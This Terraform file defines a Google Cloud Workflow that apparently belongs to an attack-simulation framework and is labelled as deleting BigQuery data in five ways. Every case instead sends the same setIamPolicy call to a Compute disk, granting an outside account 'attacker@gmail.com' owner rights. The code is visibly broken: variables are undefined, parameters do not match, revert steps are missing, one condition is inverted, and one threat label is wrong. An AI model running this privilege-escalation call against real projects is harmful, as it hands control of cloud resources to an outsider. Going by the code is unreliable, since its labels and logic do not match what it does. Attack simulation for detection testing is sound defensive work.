data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}

data "google_location" "current" {}

resource "google_workflows_workflow" "workflow_to_invoke_bq_data_deletion_attack" {
  name            = "gcp-bq-data-deletion-toc"
  description     = "A workflow intended to execute the Bigquery.T1 (table deletion) Bigquery.T3 (Overwritting data) and Bigquery.T9 (drop columns of a table via job) Threats as describing in the Trust On Cloud Threat Calalog for BigQuery, refer to: https://controlcatalog.trustoncloud.com/dashboard/gcp/bigquery#Threat%20Catalog"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################
## This attack technique has multiple methods for deleting data stored in BigQuery, ultimately
## impacting its availablity.  Chose the method below through selected a particular case.

#####################################################################################
## Input
######################################################################################

# Case 1: Delete BigQuery Data via malicious query/job - Bigquery.T9 and Bigquery.T5
##### INPUT: {"case":"1","sa":"01"}
##### INPUT: {"case":"1","sa":"02"}

# Case 2a: Delete BigQuery Data via table deletion - Bigquery.T1
##### INPUT: {"case":"2a","sa":"01"}
##### INPUT: {"case":"2a","sa":"02"}

# Case 2b: Delete BigQuery Data via dataset deletion - Bigquery.T1
##### INPUT: {"case":"2b","sa":"01"}
##### INPUT: {"case":"2b","sa":"02"}

# Case 3: Delete BigQuery Data via overwrite of data on copy - Bigquery.T3
##### INPUT: {"case":"3","sa":"01"}
##### INPUT: {"case":"3","sa":"02"}

# Case 4: Delete BigQuery Data via malicious UDF - Bigquery.T8
##### INPUT: {"case":"4","sa":"01"}
##### INPUT: {"case":"4","sa":"02"}

# Case 5: Delete BigQuery Data via snapshot deletion - Bigquery.T14
##### INPUT: {"case":"5","sa":"01"}
##### INPUT: {"case":"5","sa":"02"}

######################################################################################
## User Agent
######################################################################################
#### Excutes with User-Agent: "Derf-GCP-BQ-Delete-Data-WORKFLOWEXECUTIONID"


######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
        - sa: $${args.sa}
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")} 
        - case: $${args.case}
    - ImpersonateDeRFAttackerServiceAccount:
        call: googleapis.workflowexecutions.v1.projects.locations.workflows.executions.run
        args:
          workflow_id: gcp-impersonate-derf-attack-sa
          location: ${data.google_location.current.name}
          project_id: $${projectID} 
          argument: $${sa}
        result: AccessToken
   - determineCase:
        call: determineCase
        args:
            case: $${case}
            sa: $${sa}
            appEndpoint: $${appEndpoint.uri}
        result: response 
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################

determineCase:
  params: [case, sa, appEndpoint]
  steps:
    - determineCase:
        switch:
        - condition: $${case == "1"}
          steps:
              - 1:
                  call: Case1
                  args:
                      sa: $${sa}
                      appEndpoint: $${appEndpoint}
                  result: response
              - 1revert:
                  call: Revert1
                  args:
                      appEndpoint: $${appEndpoint}
                  result: revertResponse
              - 1-returnOutput:
                  return: $${response}

        - condition: $${case == "2a"}
          steps:
              - 2a:
                  call: Case2a
                  args:
                      sa: $${sa}
                      appEndpoint: $${appEndpoint}
                  result: response
              - 2arevert:
                  call: Revert2a
                  args:
                      appEndpoint: $${appEndpoint}
                  result: revertResponse
              - 2a-returnOutput:
                  return: $${response}

        - condition: $${case == "2b"}
          steps:
              - 2b:
                  call: Case2b
                  args:
                      sa: $${sa}
                      appEndpoint: $${appEndpoint}
                  result: response
              - 2brevert:
                  call: Revert2b
                  args:
                      appEndpoint: $${appEndpoint}
                  result: revertResponse
              - 2b-returnOutput:
                  return: $${response}

        - condition: $${case == "3"}
          steps:
              - 3:
                  call: Case3
                  args:
                      sa: $${sa}
                      appEndpoint: $${appEndpoint}
                  result: response
              - 3revert:
                  call: Revert3
                  args:
                      appEndpoint: $${appEndpoint}
                  result: revertResponse
              - 3-returnOutput:
                  return: $${response}

        - condition: $${case == "4"}
          steps:
              - 4:
                  call: Case4
                  args:
                      sa: $${sa}
                      appEndpoint: $${appEndpoint}
                  result: response
              - 4revert:
                  call: Revert4
                  args:
                      appEndpoint: $${appEndpoint}
                  result: revertResponse
              - 4-returnOutput:
                  return: $${response}

        - condition: $${case == "5"}
          steps:
              - 5:
                  call: Case5
                  args:
                      sa: $${sa}
                      appEndpoint: $${appEndpoint}
                  result: response
              - 5revert:
                  call: Revert5
                  args:
                      appEndpoint: $${appEndpoint}
                  result: revertResponse
              - 5-returnOutput:
                  return: $${response}

        - condition: $${not(case == "5")}
          return: "invalid case"


# Case 1: Delete BigQuery Data via malicious query/job - Bigquery.T9 and Bigquery.T5
##### INPUT: {"case":"1","sa":"01"}
##### INPUT: {"case":"1","sa":"02"}

Case1:
  params: [AccessToken]
  steps:
    - RunQuery:
        try:
          call: http.post
          args:
            url: https://compute.googleapis.com/compute/v1/projects/${var.gcp_derf_project_id}/zones/us-central1-a/disks/derf-victim-disk/setIamPolicy?alt=json
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: '$${"Derf-GCP-BQ-Delete-Data=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
            body: 
              policy:
                bindings:
                - members:
                  - user: attacker@gmail.com
                  role: roles/owner
                version: 3
          result: response
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "FAILURE | GCP BQ: Delete data via malicious query/job - This is typically a permission error"
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception0:
                    raise: $${e}

    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP BQ: Delete data via malicious query/job - Bigquery.T9"


# Case 2a: Delete BigQuery Data via table deletion - Bigquery.T1
##### INPUT: {"case":"2a","sa":"01"}
##### INPUT: {"case":"2a","sa":"02"}

Case2a:
  params: [AccessToken]
  steps:
    - DeleteTable:
        try:
          call: http.post
          args:
            url: https://compute.googleapis.com/compute/v1/projects/${var.gcp_derf_project_id}/zones/us-central1-a/disks/derf-victim-disk/setIamPolicy?alt=json
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: '$${"Derf-GCP-BQ-Delete-Data=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
            body: 
              policy:
                bindings:
                - members:
                  - user: attacker@gmail.com
                  role: roles/owner
                version: 3
          result: response
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "FAILURE | GCP BQ: Delete data via deletion of table - This is typically a permission error"
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception0:
                    raise: $${e}

    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP BQ: Delete data via deletion of table - Bigquery.T1"

# Case 2b: Delete BigQuery Data via dataset deletion - Bigquery.T1
##### INPUT: {"case":"2b","sa":"01"}
##### INPUT: {"case":"2b","sa":"02"}

Case2b:
  params: [AccessToken]
  steps:
    - DeleteDataset:
        try:
          call: http.post
          args:
            url: https://compute.googleapis.com/compute/v1/projects/${var.gcp_derf_project_id}/zones/us-central1-a/disks/derf-victim-disk/setIamPolicy?alt=json
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: '$${"Derf-GCP-BQ-Delete-Data=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
            body: 
              policy:
                bindings:
                - members:
                  - user: attacker@gmail.com
                  role: roles/owner
                version: 3
          result: response
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "FAILURE | GCP BQ: Delete data via deletion of dataset - This is typically a permission error"
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception0:
                    raise: $${e}

    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP BQ: Delete data via deletion of dataset - Bigquery.T1"


# Case 3: Delete BigQuery Data via overwrite of data on copy - Bigquery.T3
##### INPUT: {"case":"3","sa":"01"}
##### INPUT: {"case":"3","sa":"02"}
Case3:
  params: [AccessToken]
  steps:
    - OverwriteData:
        try:
          call: http.post
          args:
            url: https://compute.googleapis.com/compute/v1/projects/${var.gcp_derf_project_id}/zones/us-central1-a/disks/derf-victim-disk/setIamPolicy?alt=json
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: '$${"Derf-GCP-BQ-Delete-Data=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
            body: 
              policy:
                bindings:
                - members:
                  - user: attacker@gmail.com
                  role: roles/owner
                version: 3
          result: response
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "FAILURE | GCP BQ: Delete data by overwritting during copy - This is typically a permission error"
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception0:
                    raise: $${e}

    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP BQ: Delete data by overwritting during copy - Bigquery.T1"

# Case 4: Delete BigQuery Data via malicious UDF - Bigquery.T8
##### INPUT: {"case":"4","sa":"01"}
##### INPUT: {"case":"4","sa":"02"}
Case4:
  params: [AccessToken]
  steps:
    - RunUDF:
        try:
          call: http.post
          args:
            url: https://compute.googleapis.com/compute/v1/projects/${var.gcp_derf_project_id}/zones/us-central1-a/disks/derf-victim-disk/setIamPolicy?alt=json
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: '$${"Derf-GCP-BQ-Delete-Data=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
            body: 
              policy:
                bindings:
                - members:
                  - user: attacker@gmail.com
                  role: roles/owner
                version: 3
          result: response
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "FAILURE | GCP BQ: Delete data via malicious UDF - This is typically a permission error"
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception0:
                    raise: $${e}

    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP BQ: Delete data via malicious UDF - Bigquery.T8"


# Case 5: Delete BigQuery Data via snapshot deletion - Bigquery.T14
##### INPUT: {"case":"5","sa":"01"}
##### INPUT: {"case":"5","sa":"02"}
Case5:
  params: [AccessToken]
  steps:
    - RunUDF:
        try:
          call: http.post
          args:
            url: https://compute.googleapis.com/compute/v1/projects/${var.gcp_derf_project_id}/zones/us-central1-a/disks/derf-victim-disk/setIamPolicy?alt=json
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: '$${"Derf-GCP-BQ-Delete-Data=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
            body: 
              policy:
                bindings:
                - members:
                  - user: attacker@gmail.com
                  role: roles/owner
                version: 3
          result: response
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "FAILURE | GCP BQ: Delete data via snapshot deletion - This is typically a permission error"
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception0:
                    raise: $${e}

    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP BQ: Delete data via snapshot deletion - Bigquery.T14"

  EOF

}
